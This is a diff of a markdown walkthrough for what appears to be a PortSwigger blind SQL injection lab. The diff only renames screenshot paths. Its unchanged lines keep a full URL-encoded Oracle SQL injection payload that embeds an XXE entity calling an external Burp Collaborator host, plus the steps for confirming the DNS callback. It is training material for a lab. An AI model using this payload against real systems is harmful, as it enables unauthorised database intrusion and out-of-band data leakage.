@@ -11,7 +11,7 @@ ___
 
 **NOTE:** DNS Lookup
 
-![screnshot](./images/lab16_0.png)
+![screnshot](images/lab16_0.jpg)
 
 
 step 1
@@ -29,7 +29,7 @@ URL Encoded =>
 TrackingId=uy2rqNgHygVohssd'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//8u3u2igoxnoyvhpu3ecnmejam1ssgi47.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
 
-![screnshot](./images/lab16_1.png)
+![screnshot](images/lab16_1.jpg)
 
 
 step 2
@@ -38,6 +38,6 @@ go to burp collaborator
 click on Poll now you will see DNS received
 and your lab  will solved
 
-![screnshot](./images/lab16_2.png)
+![screnshot](images/lab16_2.jpg)
 
-![screnshot](./images/lab16_3.png)
+![screnshot](images/lab16_3.jpg)
